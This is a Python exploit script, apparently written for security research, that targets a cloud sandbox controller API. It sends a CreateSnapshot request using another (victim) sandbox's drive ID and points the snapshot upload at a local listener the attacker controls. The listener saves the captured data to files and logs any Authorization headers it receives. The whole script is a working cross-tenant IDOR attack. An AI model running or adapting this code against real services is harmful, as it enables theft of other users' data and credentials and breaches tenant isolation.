# -*- coding: utf-8 -*-
"""v217 payload (沙箱 A): 跨沙箱 driveId IDOR + 上传捕获
1. listener 0.0.0.0:18081 捕获上传 -> 写 /vercel/sandbox/v217_cap_N.bin (resume 后读)
2. CreateSnapshot(driveId=受害者沙箱 B sid, bucketBaseUrl=s3://127.0.0.1:18081/snap/x)
3. 记录响应 + 持续监听
"""
import socket, time, json, threading, sys

VICTIM = sys.argv[1] if len(sys.argv) > 1 else 'none'

def wlog(name, content):
    try:
        open('/vercel/sandbox/v217_%s' % name, 'w').write(content)
    except Exception:
        pass
    print('[%.1f] %s %s' % (time.time(), name, content[:300]), flush=True)

RECV = []
LOCK = threading.Lock()

def listener():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('0.0.0.0', 18081))
        srv.listen(20)
        srv.settimeout(1)
        wlog('lup', 'LISTENER UP')
        end = time.time() + 45
        while time.time() < end:
            try:
                c, a = srv.accept()
            except socket.timeout:
                continue
            c.settimeout(4)
            d = b''
            try:
                while True:
                    x = c.recv(65536)
                    if not x:
                        break
                    d += x
                    if len(d) > 4000000:
                        break
            except Exception:
                pass
            try:
                c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}')
            except Exception:
                pass
            c.close()
            with LOCK:
                RECV.append((a, d))
                fn = '/vercel/sandbox/v217_cap_%d.bin' % len(RECV)
                try:
                    open(fn, 'wb').write(d)
                except Exception:
                    pass
                hdr = d.split(b'\r\n\r\n', 1)[0]
                wlog('cap%d' % len(RECV), '%s %d bytes, head: %r' % (a, len(d), hdr[:400]))
                for line in hdr.split(b'\r\n'):
                    if line.lower().startswith(b'authorization:'):
                        wlog('auth%d' % len(RECV), '%r' % line[:600])
        srv.close()
    except Exception as e:
        wlog('lexc', '%r' % e)

t = threading.Thread(target=listener, daemon=True)
t.start()
time.sleep(2)

CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'

def post(port, path, body, t=8):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 6000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

wlog('start', 'victim=%s' % VICTIM)
st, pay = post(23456, '/' + CTRL + '/CreateSnapshot',
               {'driveId': VICTIM, 'bucketBaseUrl': 's3://127.0.0.1:18081/snap/x'}, t=10)
wlog('snap_resp', '%s %r' % (st, pay[:800]))

# 持续监听等待上传 (若进程未被杀)
time.sleep(20)
with LOCK:
    wlog('total', 'RECV %d' % len(RECV))
wlog('done', 'ALL DONE')
